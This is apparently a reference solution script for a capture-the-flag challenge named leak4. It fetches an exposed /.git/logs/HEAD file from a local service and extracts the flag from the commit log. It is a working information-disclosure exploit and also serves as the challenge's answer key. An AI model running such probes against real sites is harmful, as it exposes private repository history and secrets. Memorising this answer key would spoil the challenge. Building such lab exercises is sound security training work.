#!/usr/bin/env python3
"""Reference exploit for leak4 (formerly leak-git).

Fetch /.git/logs/HEAD and pull the flag out of the initial commit message.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8013")


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)
    r = requests.get(BASE + "/.git/logs/HEAD", timeout=5)
    if r.status_code != 200:
        sys.stderr.write(f".git/logs/HEAD -> {r.status_code}\n")
        return 1
    m = re.search(r"flag\{[^}]*\}", r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write("no flag in reflog\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
